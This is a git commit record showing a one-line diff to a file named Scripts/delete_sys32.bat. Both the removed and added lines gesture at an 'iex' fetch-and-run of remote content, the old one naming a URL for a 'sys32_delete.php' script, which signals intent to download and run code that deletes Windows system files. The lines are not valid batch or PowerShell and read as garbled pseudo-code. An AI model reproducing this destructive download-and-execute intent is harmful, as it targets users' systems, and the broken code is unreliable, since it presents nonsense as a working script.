546e767e37420ed31eadd3a2ba2dfca16c4962ea
Shlexware-Production <seliwarev1@gmail.com>
2025-04-25 20:59:26 +0200

    Update delete_sys32.bat

--- Scripts/delete_sys32.bat
+++ Scripts/delete_sys32.bat
@@ -1,1 +1,1 @@
-iex (httpRequest: from iex as httpclinent) > Run{nul, main, false, 104: Request > https://git.com/sxx-fx/rep/main/sys32_delete.php< }
+iex (httpRequest: from iex as httpclinent) > Run{nul, main, false, 104: Request > {[[COMPILED WITH HD8s COMPILER{34248; 546456 >> null << cmd(http:git?) <response>}]]} < }
